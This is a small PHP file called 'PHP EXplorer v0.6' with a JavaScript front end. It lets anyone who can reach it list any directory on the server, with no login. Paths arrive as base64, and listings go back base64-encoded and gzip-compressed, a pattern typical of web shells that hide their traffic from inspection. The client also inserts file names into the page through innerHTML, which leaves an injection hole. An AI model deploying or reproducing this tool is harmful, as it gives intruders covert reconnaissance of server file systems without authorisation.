<?php
/* PHP EXplorer v0.6 */
function h($s,$c=0){header(($c>0?'HTTP/1.0 '.$c.' ':'').$s);if($c>299){die("<h1>".$s);}}

if (isset($_REQUEST['f'])){
	die;
}

$d=@$_REQUEST['d'];

if ($d){
	$d=base64_decode($d);
	$i=scandir($d);
	if($i!==false)
	{
		$r=$f=array();
		foreach($i as $n)
		{
			if ($n=='.')
				continue;
			
			if (is_dir($d.DIRECTORY_SEPARATOR.$n))
				$r[]=$n;
			else
				$f[]=$n;
		}
	}
	else h('Forbidden',403);
	$x=json_encode(array(realpath($d),$r,$f));
	$z=gzencode(base64_encode($x),9);
	h('content-encoding: gzip');
	echo $z;
	die;
}


?>
<!DOCTYPE html><head><meta charset="utf-8"> <style>
body{font:11px Tahoma;}
P{color:#000;display:block;margin:0;}
P:HOVER{color:blue;background:#ddd;cursor:pointer;}
input{border:1px solid #000;}
</style></head><body>
<input id="f"><button onclick="g('.')">GO</button>
<div id="l"></div>
<script>
var f=document.getElementById("f");
var l=document.getElementById("l");
g(".");

function _a(j){
}

function g(j){
var x=new XMLHttpRequest();
x.onreadystatechange=function(){if(this.readyState==4&&this.status==200){_r(this.responseText);}};
params="d="+btoa(f.value.replace('\\','/')+'/'+j);
x.open("POST","",1);
x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
x.send(params);
}

function _r(x){
var r=JSON.parse(atob(x));
f.value=r[0];
l.innerHTML="";
r[1].forEach(function(e){l.innerHTML+="<p onClick=\"g('"+e+"')\">["+e+"]</p>";});
r[2].forEach(function(e){l.innerHTML+="<p onClick=\"_a('"+e+"')\">"+e+"</p>";});
}
</script>